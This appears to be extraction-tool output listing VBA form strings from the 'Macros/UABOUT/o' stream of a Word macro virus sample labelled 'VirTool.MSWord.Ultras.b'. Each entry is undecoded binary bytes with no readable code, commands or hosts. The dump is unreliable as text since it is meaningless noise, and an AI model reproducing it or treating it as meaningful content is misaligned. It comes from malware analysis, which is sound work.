-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����������@@y
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
ppt���������MMN
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  "��ɓ��++-..1114������������YY\DDGFFJHHLTTX������������������������>>A::=558002**,$$&������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������  J
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
P@@����������``�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�޿��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
d@@�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
i����������������  �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
|����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
x������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

@@A������LLM
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ȑ��'')++-..0���������;;?>>BAAECCGEEIGGKHHL���������������������==@99<447//1))+##%������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
S@@�������00�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�࿿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
z������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
t@@�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
{�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
G���@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
w��ȿ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=PPr00M
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������JJK
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ǐ��$$&'')++-������ttv99<<<?>>B���OOSEEIFFJSSV������������������<<?88;336..1))+##$������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ď��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V@@�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00�PP�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
叏�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�῿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������PP�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���@@D
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
@@X���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
E���``�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�00����PP�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������III
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ǝ��!!"$$&((*������33566999<<<?���qqtCCGDDHEEI������������������;;?88;336}}������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���PPi
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W@@�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�޿��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PP�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�㿿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���003
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
00I���
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
D����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�PP����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
=����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
������GGG
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��Ō��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
!!#%%'������00344677:::=���oorAAECCGDDH������������������;;?88;336���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
W@@�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�῿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�俿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
B��ҟ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
r``�``�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
<����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����EEF
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
��ċ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
 ""$������..022455888<���nnq@@DBBFCCG������������������<<?88;447���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
V@@�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�⿿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�濿�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�����������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
A��ҿ��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
p��ş��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
~������@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
;��˿�����������DDD			
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���^^^
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
  !������,,.00344677:���nnp??CAAECCF������������������<<@99<558ddf������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
T@@�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�珏�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�@@�@@׏���������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�����������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����@@�
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Ϳ�����
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
����  �
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
�  �������������������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
?������
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
n��
-------------------------------------------------------------------------------
VBA FORM STRING IN 'VirTool.MSWord.Ultras.b' - OLE stream: 'Macros/UABOUT/o'
